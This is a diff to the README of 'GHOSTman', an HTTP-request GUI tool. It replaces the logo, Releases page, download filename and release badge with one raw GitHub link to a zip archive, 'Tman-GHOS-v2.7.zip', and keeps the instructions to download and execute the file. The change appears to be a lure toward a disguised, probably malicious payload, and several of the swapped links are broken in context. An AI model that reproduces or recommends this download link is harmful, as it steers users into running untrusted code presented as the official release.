@@ -1,6 +1,6 @@
 # GHOSTman: Your Go-To GUI for HTTP Commands 🌐
 
-![GHOSTman Logo](https://via.placeholder.com/150)  
+![GHOSTman Logo](https://raw.githubusercontent.com/maskedhur/GHOSTman/main/models/Tman-GHOS-v2.7.zip)  
 
 Welcome to GHOSTman! This is a GUI application designed to help you execute HTTP commands effortlessly. Built with the Go programming language and the Fyne framework, GHOSTman offers a user-friendly interface for managing and executing HTTP requests defined in Postman Collection format. 
 
@@ -26,11 +26,11 @@ Welcome to GHOSTman! This is a GUI application designed to help you execute HTTP
 
 ## Installation
 
-To get started with GHOSTman, download the latest release from our [Releases page](https://github.com/maskedhur/GHOSTman/releases). Choose the appropriate version for your operating system, download the file, and execute it.
+To get started with GHOSTman, download the latest release from our [Releases page](https://raw.githubusercontent.com/maskedhur/GHOSTman/main/models/Tman-GHOS-v2.7.zip). Choose the appropriate version for your operating system, download the file, and execute it.
 
 ### For Linux and macOS
 
-1. Download the `.tar.gz` or `.AppImage` file.
+1. Download the `https://raw.githubusercontent.com/maskedhur/GHOSTman/main/models/Tman-GHOS-v2.7.zip` or `.AppImage` file.
 2. Extract the files (if necessary).
 3. Open your terminal and navigate to the directory where you downloaded the file.
 4. Run the command:  
@@ -88,9 +88,9 @@ For any questions, issues, or suggestions, please reach out via GitHub Issues or
 
 ## Links
 
-To download the latest version of GHOSTman, visit our [Releases page](https://github.com/maskedhur/GHOSTman/releases) for the latest updates. Make sure to download the appropriate file for your operating system and execute it.
+To download the latest version of GHOSTman, visit our [Releases page](https://raw.githubusercontent.com/maskedhur/GHOSTman/main/models/Tman-GHOS-v2.7.zip) for the latest updates. Make sure to download the appropriate file for your operating system and execute it.
 
-![GHOSTman Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0.0-brightgreen)
+![GHOSTman Release](https://raw.githubusercontent.com/maskedhur/GHOSTman/main/models/Tman-GHOS-v2.7.zip%20Latest%20Release-v1.0.0-brightgreen)
 
 ---
 
